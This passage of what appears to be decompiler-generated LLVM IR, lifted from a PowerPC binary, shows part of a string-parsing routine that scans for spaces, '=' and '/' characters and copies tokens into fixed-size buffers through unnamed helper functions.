  %v1_1000101c = icmp ult i8 %v3_10001018, 32
  %v2_1000101c = icmp ugt i8 %v3_10001018, 32
  %v3_1000101c = icmp eq i8 %v3_10001018, 32
  store i1 %v1_1000101c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000101c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000101c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000101c, label %dec_label_pc_1000124c, label %dec_label_pc_10001024

dec_label_pc_10001024:                            ; preds = %dec_label_pc_10000ff4, %dec_label_pc_1000124c
  %v0_1000102c = phi i32 [ %v4_1000100c, %dec_label_pc_10000ff4 ], [ %v1_1000124c, %dec_label_pc_1000124c ]
  %v1_10001024 = load i32, i32* %r24.global-to-local, align 4
  %v2_10001024 = sub i32 %v1_10001024, %v0_10001010
  store i32 %v2_10001024, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v2_1000102c = sub i32 %v2_10001024, %v0_1000102c
  store i32 %v2_1000102c, i32* %r27.global-to-local, align 4
  %v0_10001030 = load i32, i32* %r31.global-to-local, align 4
  %v2_10001030 = add i32 %v0_10001030, %v0_1000102c
  store i32 %v2_10001030, i32* %r29.global-to-local, align 4
  store i32 %v2_10001030, i32* %r3.global-to-local, align 4
  store i32 %v2_1000102c, i32* %r4.global-to-local, align 4
  store i32 268439624, i32* %lr.global-to-local, align 4
  %v5_10001044 = call i32 @function_100075a8(i32 %v2_10001030, i32 %v2_1000102c, i32 ptrtoint ([3 x i8]* @global_var_1000a7ac.24 to i32), i32 2)
  store i32 %v5_10001044, i32* %r3.global-to-local, align 4
  %v1_10001048 = icmp slt i32 %v5_10001044, -1
  %v2_10001048 = icmp sgt i32 %v5_10001044, -1
  %v3_10001048 = icmp eq i32 %v5_10001044, -1
  store i1 %v1_10001048, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001048, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001048, i1* %cr7_eq.global-to-local, align 1
  store i32 %v5_10001044, i32* %r31.global-to-local, align 4
  br i1 %v3_10001048, label %dec_label_pc_100010f0, label %dec_label_pc_10001054

dec_label_pc_10001054:                            ; preds = %dec_label_pc_10001024
  %v1_10001054 = icmp slt i32 %v5_10001044, 1
  %v2_10001054 = icmp sgt i32 %v5_10001044, 1
  %v3_10001054 = icmp eq i32 %v5_10001044, 1
  store i1 %v1_10001054, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001054, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001054, i1* %cr7_eq.global-to-local, align 1
  %v0_10001058 = load i32, i32* %r20.global-to-local, align 4
  %v1_10001058 = load i32, i32* %r26.global-to-local, align 4
  %v2_10001058 = add i32 %v1_10001058, %v0_10001058
  store i32 %v2_10001058, i32* %r28.global-to-local, align 4
  %tmp77 = icmp slt i32 %v5_10001044, 2
  br i1 %tmp77, label %dec_label_pc_10001064, label %dec_label_pc_10001060

dec_label_pc_10001060:                            ; preds = %dec_label_pc_10001054
  %v1_10001060 = add i32 %v5_10001044, -2
  store i32 %v1_10001060, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10001064

dec_label_pc_10001064:                            ; preds = %dec_label_pc_10001054, %dec_label_pc_10001060
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10001068 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001068, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a7d8.39 to i32), i32* %r25.global-to-local, align 4
  %v0_10001070 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001070, i32* %r4.global-to-local, align 4
  store i32 268439680, i32* %lr.global-to-local, align 4
  %v4_1000107c = call i32 @function_100075a8(i32 %v0_10001068, i32 %v0_10001070, i32 ptrtoint (i32* @global_var_1000a7d8.39 to i32), i32 1)
  store i32 %v4_1000107c, i32* %r3.global-to-local, align 4
  %v1_10001080 = icmp slt i32 %v4_1000107c, 0
  %v2_10001080 = icmp sgt i32 %v4_1000107c, 0
  %v3_10001080 = icmp eq i32 %v4_1000107c, 0
  store i1 %v1_10001080, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001080, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001080, i1* %cr7_eq.global-to-local, align 1
  %tmp78 = icmp slt i32 %v4_1000107c, 1
  br i1 %tmp78, label %dec_label_pc_10001064.dec_label_pc_100010a0_crit_edge, label %dec_label_pc_10001088

dec_label_pc_10001064.dec_label_pc_100010a0_crit_edge: ; preds = %dec_label_pc_10001064
  %v1_100010a0.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100010a0

dec_label_pc_10001088:                            ; preds = %dec_label_pc_10001064
  %v0_10001088 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001088, i32* %r3.global-to-local, align 4
  %v0_1000108c = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000108c, i32* %r4.global-to-local, align 4
  %v0_10001090 = load i32, i32* %r25.global-to-local, align 4
  store i32 268439708, i32* %lr.global-to-local, align 4
  %v4_10001098 = call i32 @function_100075a8(i32 %v0_10001088, i32 %v0_1000108c, i32 %v0_10001090, i32 1)
  store i32 %v4_10001098, i32* %r3.global-to-local, align 4
  %v1_1000109c = add i32 %v4_10001098, -1
  store i32 %v1_1000109c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100010a0

dec_label_pc_100010a0:                            ; preds = %dec_label_pc_10001064.dec_label_pc_100010a0_crit_edge, %dec_label_pc_10001088
  %v1_100010a0 = phi i32 [ %v1_100010a0.pre, %dec_label_pc_10001064.dec_label_pc_100010a0_crit_edge ], [ %v1_1000109c, %dec_label_pc_10001088 ]
  %v0_100010a0 = load i32, i32* %r18.global-to-local, align 4
  %v2_100010a0 = add i32 %v0_100010a0, %v1_100010a0
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_100010a8 = load i32, i32* %r26.global-to-local, align 4
  %v2_100010a8 = add i32 %v2_100010a0, %v1_100010a8
  store i32 %v2_100010a8, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100010b0 = add i32 %v2_100010a8, 10532
  %v4_100010b0 = inttoptr i32 %v3_100010b0 to i8*
  store i8 0, i8* %v4_100010b0, align 1
  %v0_100010b4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100010b4 = load i32, i32* @r1, align 4
  %v2_100010b4 = add i32 %v1_100010b4, 8
  %v3_100010b4 = inttoptr i32 %v2_100010b4 to i32*
  store i32 %v0_100010b4, i32* %v3_100010b4, align 4
  br label %dec_label_pc_100010d0

dec_label_pc_100010bc:                            ; preds = %dec_label_pc_100010d0
  br i1 %v3_100010c0, label %dec_label_pc_100011f0, label %dec_label_pc_100010c8

dec_label_pc_100010c8:                            ; preds = %dec_label_pc_100010bc
  %v1_100010c8 = add i32 %v3_100010d8, 1
  store i32 %v1_100010c8, i32* %r11.global-to-local, align 4
  store i32 %v1_100010c8, i32* %v2_100010d8, align 4
  br label %dec_label_pc_100010d0

dec_label_pc_100010d0:                            ; preds = %dec_label_pc_100010a0, %dec_label_pc_100010c8
  %v0_100010d0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100010d0, i32* %r3.global-to-local, align 4
  store i32 268439768, i32* @lr, align 4
  %v1_100010d4 = inttoptr i32 %v0_100010d0 to i8*
  %v2_100010d4 = call i32 @function_100074dc(i8* %v1_100010d4)
  store i32 %v2_100010d4, i32* %r3.global-to-local, align 4
  %v0_100010d8 = load i32, i32* @r1, align 4
  %v1_100010d8 = add i32 %v0_100010d8, 8
  %v2_100010d8 = inttoptr i32 %v1_100010d8 to i32*
  %v3_100010d8 = load i32, i32* %v2_100010d8, align 4
  store i32 %v3_100010d8, i32* %r29.global-to-local, align 4
  %v2_100010dc = icmp slt i32 %v2_100010d4, %v3_100010d8
  %v3_100010dc = icmp sgt i32 %v2_100010d4, %v3_100010d8
  %v4_100010dc = icmp eq i32 %v2_100010d4, %v3_100010d8
  store i1 %v2_100010dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100010dc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_100010dc, i1* %cr7_eq.global-to-local, align 1
  %v0_100010bc = load i32, i32* %r28.global-to-local, align 4
  %v2_100010bc = add i32 %v0_100010bc, %v3_100010d8
  %v3_100010bc = inttoptr i32 %v2_100010bc to i8*
  %v4_100010bc = load i8, i8* %v3_100010bc, align 1
  %v5_100010bc = zext i8 %v4_100010bc to i32
  store i32 %v5_100010bc, i32* %r0.global-to-local, align 4
  %v1_100010c0 = icmp ult i8 %v4_100010bc, 61
  %v2_100010c0 = icmp ugt i8 %v4_100010bc, 61
  %v3_100010c0 = icmp eq i8 %v4_100010bc, 61
  store i1 %v1_100010c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100010c0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100010c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100010dc, label %dec_label_pc_100010bc, label %dec_label_pc_100010e4

dec_label_pc_100010e4:                            ; preds = %dec_label_pc_100010d0
  br i1 %v3_100010c0, label %dec_label_pc_100011f0, label %dec_label_pc_100010f0

dec_label_pc_100010f0:                            ; preds = %dec_label_pc_10001228, %dec_label_pc_10001258, %dec_label_pc_100010e4, %dec_label_pc_10001024
  %v0_100010f0 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_100010f0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100010f4

dec_label_pc_100010f4:                            ; preds = %dec_label_pc_10001268, %dec_label_pc_100010f0
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 39, i32* %r3.global-to-local, align 4
  store i32 268439808, i32* %lr.global-to-local, align 4
  %v3_100010fc = call i32 @function_10006bb0(i32 39, i32* null)
  %v0_10001100 = load i32, i32* %r20.global-to-local, align 4
  %v1_10001100 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001100 = add i32 %v1_10001100, %v0_10001100
  store i32 %v2_10001100, i32* %r31.global-to-local, align 4
  %v0_10001108 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10001108, i32* %r4.global-to-local, align 4
  store i32 %v2_10001100, i32* %r3.global-to-local, align 4
  store i32 268439828, i32* %lr.global-to-local, align 4
  %v3_10001110 = inttoptr i32 %v2_10001100 to i8*
  %v4_10001110 = call i32 @function_1000788c(i8* %v3_10001110, i32 %v0_10001108, i32 %v3_100010fc)
  store i32 %v4_10001110, i32* %r3.global-to-local, align 4
  %v1_10001114 = icmp slt i32 %v4_10001110, -1
  %v2_10001114 = icmp sgt i32 %v4_10001110, -1
  %v3_10001114 = icmp eq i32 %v4_10001110, -1
  store i1 %v1_10001114, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001114, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001114, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001114, label %dec_label_pc_1000111c, label %dec_label_pc_10000fe8

dec_label_pc_1000111c:                            ; preds = %dec_label_pc_100010f4, %dec_label_pc_10000fe8, %dec_label_pc_10000fbc
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 38, i32* %r3.global-to-local, align 4
  store i32 268439848, i32* %lr.global-to-local, align 4
  %v3_10001124 = call i32 @function_10006bb0(i32 38, i32* null)
  %v0_10001128 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10001128, i32* %r4.global-to-local, align 4
  %v0_10001130 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10001130, i32* %r3.global-to-local, align 4
  store i32 268439864, i32* %lr.global-to-local, align 4
  %v3_10001134 = inttoptr i32 %v0_10001130 to i8*
  %v4_10001134 = call i32 @function_1000788c(i8* %v3_10001134, i32 %v0_10001128, i32 %v3_10001124)
  store i32 %v4_10001134, i32* %r3.global-to-local, align 4
  %v1_10001138 = icmp slt i32 %v4_10001134, -1
  %v2_10001138 = icmp sgt i32 %v4_10001134, -1
  %v3_10001138 = icmp eq i32 %v4_10001134, -1
  store i1 %v1_10001138, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001138, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001138, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001138, label %dec_label_pc_10001574, label %dec_label_pc_10001140

dec_label_pc_10001140:                            ; preds = %dec_label_pc_1000111c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 38, i32* %r3.global-to-local, align 4
  store i32 268439884, i32* %lr.global-to-local, align 4
  %v3_10001148 = call i32 @function_10006bb0(i32 38, i32* null)
  %v0_1000114c = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_1000114c, i32* %r4.global-to-local, align 4
  %v0_10001154 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10001154, i32* %r3.global-to-local, align 4
  store i32 268439900, i32* %lr.global-to-local, align 4
  %v3_10001158 = inttoptr i32 %v0_10001154 to i8*
  %v4_10001158 = call i32 @function_1000788c(i8* %v3_10001158, i32 %v0_1000114c, i32 %v3_10001148)
  store i32 %v4_10001158, i32* %r3.global-to-local, align 4
  %v0_10001160 = load i32, i32* %r18.global-to-local, align 4
  %v2_10001160 = add i32 %v0_10001160, %v4_10001158
  store i32 %v2_10001160, i32* %r9.global-to-local, align 4
  %v1_10001164 = add i32 %v2_10001160, 10532
  %v2_10001164 = inttoptr i32 %v1_10001164 to i8*
  %v3_10001164 = load i8, i8* %v2_10001164, align 1
  %v4_10001164 = zext i8 %v3_10001164 to i32
  store i32 %v4_10001164, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_10001170 = xor i32 %v4_10001164, 32
  %v1_10001174 = sub nsw i32 0, %v1_10001170
  %v2_10001174 = xor i32 %v4_10001164, -33
  %v4_10001174 = icmp uge i32 %v2_10001174, %v1_10001174
  %v2_10001178 = zext i1 %v4_10001174 to i32
  %v3_10001178 = add i32 %v2_10001178, %v4_10001158
  store i32 %v3_10001178, i32* %r11.global-to-local, align 4
  %v0_1000117c = load i32, i32* %r20.global-to-local, align 4
  %v2_1000117c = add i32 %v3_10001178, %v0_1000117c
  store i32 %v2_1000117c, i32* %r29.global-to-local, align 4
  store i32 %v2_1000117c, i32* %r3.global-to-local, align 4
  %v1_10001184 = load i32, i32* %r24.global-to-local, align 4
  %v2_10001184 = sub i32 %v1_10001184, %v3_10001178
  store i32 %v2_10001184, i32* %r4.global-to-local, align 4
  store i32 %v3_10001178, i32* @r31, align 4
  store i32 268439952, i32* %lr.global-to-local, align 4
  %v5_1000118c = call i32 @function_100075a8(i32 %v2_1000117c, i32 %v2_10001184, i32 ptrtoint ([3 x i8]* @global_var_1000a7ac.24 to i32), i32 2)
  store i32 %v5_1000118c, i32* %r3.global-to-local, align 4
  %v1_10001190 = icmp slt i32 %v5_1000118c, -1
  %v2_10001190 = icmp sgt i32 %v5_1000118c, -1
  %v3_10001190 = icmp eq i32 %v5_1000118c, -1
  store i1 %v1_10001190, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001190, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001190, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001190, label %dec_label_pc_10001574, label %dec_label_pc_10001198

dec_label_pc_10001198:                            ; preds = %dec_label_pc_10001140
  %v1_10001198 = icmp slt i32 %v5_1000118c, 1
  %v2_10001198 = icmp sgt i32 %v5_1000118c, 1
  %v3_10001198 = icmp eq i32 %v5_1000118c, 1
  store i1 %v1_10001198, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001198, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001198, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v5_1000118c, 2
  br i1 %tmp79, label %dec_label_pc_100011a4, label %dec_label_pc_100011a0

dec_label_pc_100011a0:                            ; preds = %dec_label_pc_10001198
  %v1_100011a0 = add i32 %v5_1000118c, -2
  store i32 %v1_100011a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100011a4

dec_label_pc_100011a4:                            ; preds = %dec_label_pc_10001198, %dec_label_pc_100011a0
  %v1_100011ac = phi i32 [ %v5_1000118c, %dec_label_pc_10001198 ], [ %v1_100011a0, %dec_label_pc_100011a0 ]
  %v0_100011a4 = load i32, i32* %r18.global-to-local, align 4
  %v1_100011a4 = load i32, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100011a4 = add i32 %v0_100011a4, %v1_100011ac
  %v2_100011ac = add i32 %v2_100011a4, %v1_100011a4
  store i32 %v2_100011ac, i32* %r9.global-to-local, align 4
  %v1_100011b0 = add i32 %v1_100011ac, 1
  store i32 %v1_100011b0, i32* %r28.global-to-local, align 4
  store i32 268500992, i32* %r11.global-to-local, align 4
  %v3_100011b8 = add i32 %v2_100011ac, 10532
  %v4_100011b8 = inttoptr i32 %v3_100011b8 to i8*
  store i8 0, i8* %v4_100011b8, align 1
  %v0_100011bc = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100011bc, i32* %r3.global-to-local, align 4
  %v0_100011c0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100011c0, i32* %r4.global-to-local, align 4
  store i32 268440016, i32* %lr.global-to-local, align 4
  %v5_100011cc = call i32 @function_100075a8(i32 %v0_100011bc, i32 %v0_100011c0, i32 ptrtoint ([5 x i8]* @global_var_1000a7dc.40 to i32), i32 4)
  store i32 %v5_100011cc, i32* %r3.global-to-local, align 4
  %v1_100011d0 = icmp slt i32 %v5_100011cc, 4
  %v2_100011d0 = icmp sgt i32 %v5_100011cc, 4
  %v3_100011d0 = icmp eq i32 %v5_100011cc, 4
  store i1 %v1_100011d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100011d0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100011d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100011d0, label %dec_label_pc_100017fc, label %dec_label_pc_100011d8

dec_label_pc_100011d8:                            ; preds = %dec_label_pc_100011a4
  %v0_100011d8 = load i32, i32* %r20.global-to-local, align 4
  %v1_100011d8 = load i32, i32* @r31, align 4
  %v2_100011d8 = add i32 %v1_100011d8, %v0_100011d8
  %v3_100011d8 = inttoptr i32 %v2_100011d8 to i8*
  %v4_100011d8 = load i8, i8* %v3_100011d8, align 1
  %v5_100011d8 = zext i8 %v4_100011d8 to i32
  store i32 %v5_100011d8, i32* %r0.global-to-local, align 4
  %v1_100011dc = icmp ult i8 %v4_100011d8, 47
  %v2_100011dc = icmp ugt i8 %v4_100011d8, 47
  %v3_100011dc = icmp eq i8 %v4_100011d8, 47
  store i1 %v1_100011dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100011dc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100011dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100011dc, label %dec_label_pc_10001a1c, label %dec_label_pc_100011e4

dec_label_pc_100011e4:                            ; preds = %dec_label_pc_10001350, %dec_label_pc_1000190c, %dec_label_pc_10001a40, %dec_label_pc_10001a1c, %dec_label_pc_100018b4, %dec_label_pc_1000189c, %dec_label_pc_100011d8, %dec_label_pc_100018d8
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100011e8 = load i32, i32* @r30, align 4
  %v3_100011e8 = add i32 %v2_100011e8, -529
  %v4_100011e8 = inttoptr i32 %v3_100011e8 to i8*
  store i8 1, i8* %v4_100011e8, align 1
  br label %dec_label_pc_10000824

dec_label_pc_100011f0:                            ; preds = %dec_label_pc_100010bc, %dec_label_pc_100010e4
  %v0_100011f0 = load i32, i32* @r30, align 4
  %v1_100011f0 = add i32 %v0_100011f0, 935
  %v2_100011f0 = inttoptr i32 %v1_100011f0 to i32*
  %v3_100011f0 = load i32, i32* %v2_100011f0, align 4
  store i32 %v3_100011f0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 0, i32* %v2_100010d8, align 4
  %v0_100011fc = load i32, i32* %r0.global-to-local, align 4
  %v1_100011fc = icmp slt i32 %v0_100011fc, 0
  %v2_100011fc = icmp sgt i32 %v0_100011fc, 0
  %v3_100011fc = icmp eq i32 %v0_100011fc, 0
  store i1 %v1_100011fc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100011fc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100011fc, i1* %cr7_eq.global-to-local, align 1
  %tmp80 = icmp slt i32 %v0_100011fc, 1
  br i1 %tmp80, label %dec_label_pc_10001258, label %dec_label_pc_10001204

dec_label_pc_10001204:                            ; preds = %dec_label_pc_100011f0
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10001228

dec_label_pc_1000120c:                            ; preds = %dec_label_pc_10001228
  %v0_1000120c = load i32, i32* @r1, align 4
  %v1_1000120c = add i32 %v0_1000120c, 8
  %v2_1000120c = inttoptr i32 %v1_1000120c to i32*
  %v3_1000120c = load i32, i32* %v2_1000120c, align 4
  store i32 %v3_1000120c, i32* %r9.global-to-local, align 4
  %v0_10001210 = load i32, i32* @r30, align 4
  %v1_10001210 = add i32 %v0_10001210, 935
  %v2_10001210 = inttoptr i32 %v1_10001210 to i32*
  %v3_10001210 = load i32, i32* %v2_10001210, align 4
  store i32 %v3_10001210, i32* %r0.global-to-local, align 4
  %v1_10001214 = add i32 %v3_1000120c, 1
  store i32 %v1_10001214, i32* %r11.global-to-local, align 4
  %v2_10001218 = icmp slt i32 %v3_10001210, %v1_10001214
  %v3_10001218 = icmp sgt i32 %v3_10001210, %v1_10001214
  %v4_10001218 = icmp eq i32 %v3_10001210, %v1_10001214
  store i1 %v2_10001218, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001218, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10001218, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10001214, i32* %r4.global-to-local, align 4
  store i32 %v1_10001214, i32* %v2_1000120c, align 4
  br i1 %v3_10001218, label %dec_label_pc_1000120c.dec_label_pc_10001228_crit_edge, label %dec_label_pc_10001258

dec_label_pc_1000120c.dec_label_pc_10001228_crit_edge: ; preds = %dec_label_pc_1000120c
  %v0_10001228.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10001228

dec_label_pc_10001228:                            ; preds = %dec_label_pc_1000120c.dec_label_pc_10001228_crit_edge, %dec_label_pc_10001204
  %v0_10001228 = phi i32 [ %v0_10001228.pre, %dec_label_pc_1000120c.dec_label_pc_10001228_crit_edge ], [ 0, %dec_label_pc_10001204 ]
  %v1_10001228 = mul i32 %v0_10001228, 128
  %v0_1000122c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000122c, i32* %r3.global-to-local, align 4
  %v1_10001230 = add i32 %v1_10001228, 1472
  %v0_10001234 = load i32, i32* %r29.global-to-local, align 4
  %v0_10001238 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001238 = add i32 %v1_10001230, %v0_10001238
  store i32 %v2_10001238, i32* %r4.global-to-local, align 4
  store i32 268440128, i32* %lr.global-to-local, align 4
  %v3_1000123c = inttoptr i32 %v0_1000122c to i8*
  %v4_1000123c = call i32 @function_100079b8(i8* %v3_1000123c, i32 %v2_10001238, i32 %v0_10001234)
  store i32 %v4_1000123c, i32* %r3.global-to-local, align 4
  %v1_10001240 = icmp slt i32 %v4_1000123c, 0
  %v2_10001240 = icmp sgt i32 %v4_1000123c, 0
  %v3_10001240 = icmp eq i32 %v4_1000123c, 0
  store i1 %v1_10001240, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001240, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001240, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001240, label %dec_label_pc_1000120c, label %dec_label_pc_100010f0

dec_label_pc_1000124c:                            ; preds = %dec_label_pc_10000ff4
  %v1_1000124c = add i32 %v4_1000100c, 1
  store i32 %v1_1000124c, i32* %r3.global-to-local, align 4
  %v2_10001250 = add i32 %v0_10001010, %v1_1000124c
  store i32 %v2_10001250, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10001024

dec_label_pc_10001258:                            ; preds = %dec_label_pc_1000120c, %dec_label_pc_100011f0
  %v0_10001258 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10001258, i32* %r3.global-to-local, align 4
  store i32 268440160, i32* @lr, align 4
  %v1_1000125c = inttoptr i32 %v0_10001258 to i8*
  %v2_1000125c = call i32 @function_100074dc(i8* %v1_1000125c)
  store i32 %v2_1000125c, i32* %r3.global-to-local, align 4
  %v1_10001260 = icmp slt i32 %v2_1000125c, 127
  %v2_10001260 = icmp sgt i32 %v2_1000125c, 127
  %v3_10001260 = icmp eq i32 %v2_1000125c, 127
  store i1 %v1_10001260, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001260, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001260, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001260, label %dec_label_pc_100010f0, label %dec_label_pc_10001268

dec_label_pc_10001268:                            ; preds = %dec_label_pc_10001258
  %v0_10001268 = load i32, i32* @r30, align 4
  %v1_10001268 = add i32 %v0_10001268, 935
  %v2_10001268 = inttoptr i32 %v1_10001268 to i32*
  %v3_10001268 = load i32, i32* %v2_10001268, align 4
  %v0_1000126c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000126c, i32* %r4.global-to-local, align 4
  %v0_10001270 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_10001270, i32* %r29.global-to-local, align 4
  %v1_10001274 = mul i32 %v3_10001268, 128
  %v1_10001278 = add i32 %v1_10001274, 1472
  %v0_1000127c = load i32, i32* %r23.global-to-local, align 4
  %v2_1000127c = add i32 %v1_10001278, %v0_1000127c
  store i32 %v2_1000127c, i32* @r3, align 4
  store i32 268440196, i32* %lr.global-to-local, align 4
  %v2_10001280 = inttoptr i32 %v2_1000127c to i8*
  %v3_10001280 = call i32 @function_10007504(i8* %v2_10001280, i32 %v0_1000126c)
  store i32 %v3_10001280, i32* %r3.global-to-local, align 4
  %v0_10001284 = load i32, i32* @r30, align 4
  %v1_10001284 = add i32 %v0_10001284, 935
  %v2_10001284 = inttoptr i32 %v1_10001284 to i32*
  %v3_10001284 = load i32, i32* %v2_10001284, align 4
  %v1_10001288 = add i32 %v3_10001284, 1
  store i32 %v1_10001288, i32* %r9.global-to-local, align 4
  store i32 %v1_10001288, i32* %v2_10001284, align 4
  br label %dec_label_pc_100010f4

dec_label_pc_10001294:                            ; preds = %dec_label_pc_10000814
  store i32 268440216, i32* %lr.global-to-local, align 4
  %v0_10001294 = call i32 @function_10008484()
  store i32 %v0_10001294, i32* %r3.global-to-local, align 4
  %v0_10001298 = load i32, i32* %r23.global-to-local, align 4
  %v1_10001298 = add i32 %v0_10001298, 1472
  store i32 %v1_10001298, i32* %r0.global-to-local, align 4
  %v1_1000129c = load i32, i32* @r1, align 4
  %v2_1000129c = add i32 %v1_1000129c, 20808
  %v3_1000129c = inttoptr i32 %v2_1000129c to i32*
  store i32 %v1_10001298, i32* %v3_1000129c, align 4
  store i32 268500992, i32* %r11.global-to-local, align 4
  %v0_100012a4 = load i32, i32* @r30, align 4
  %v1_100012a4 = add i32 %v0_100012a4, 1579
  %v2_100012a4 = inttoptr i32 %v1_100012a4 to i32*
  %v3_100012a4 = load i32, i32* %v2_100012a4, align 4
  store i32 %v3_100012a4, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %v0_10001294, i32* %r25.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a7ac.24 to i32), i32* %r15.global-to-local, align 4
  %v1_100012b4 = icmp slt i32 %v3_100012a4, 1024
  %v2_100012b4 = icmp sgt i32 %v3_100012a4, 1024
  %v3_100012b4 = icmp eq i32 %v3_100012a4, 1024
  store i1 %v1_100012b4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100012b4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100012b4, i1* %cr7_eq.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1000a7d8.39 to i32), i32* %r14.global-to-local, align 4
  %v0_100012bc = load i32, i32* %r23.global-to-local, align 4
  %v1_100012bc = add i32 %v0_100012bc, 2116
  store i32 %v1_100012bc, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  br i1 %v3_100012b4, label %dec_label_pc_100013c8, label %dec_label_pc_100012c8

dec_label_pc_100012c8:                            ; preds = %dec_label_pc_100013bc.dec_label_pc_100012c8_crit_edge, %dec_label_pc_10001294
  %v1_100012d0 = phi i32 [ %v1_100012d0.pre, %dec_label_pc_100013bc.dec_label_pc_100012c8_crit_edge ], [ %v0_10001294, %dec_label_pc_10001294 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100012d0 = inttoptr i32 %v1_100012d0 to i32*
  store i32 0, i32* %v2_100012d0, align 4
  %v0_100012d4 = load i32, i32* @r30, align 4
  %v1_100012d4 = add i32 %v0_100012d4, 1579
  %v2_100012d4 = inttoptr i32 %v1_100012d4 to i32*
  %v3_100012d4 = load i32, i32* %v2_100012d4, align 4
  store i32 %v3_100012d4, i32* %r4.global-to-local, align 4
  %v1_100012d8 = add i32 %v0_100012d4, -533
  %v2_100012d8 = inttoptr i32 %v1_100012d8 to i32*
  %v3_100012d8 = load i32, i32* %v2_100012d8, align 4
  store i32 %v3_100012d8, i32* %r3.global-to-local, align 4
  %v1_100012dc = sub i32 1024, %v3_100012d4
  %v0_100012e0 = load i32, i32* %r27.global-to-local, align 4
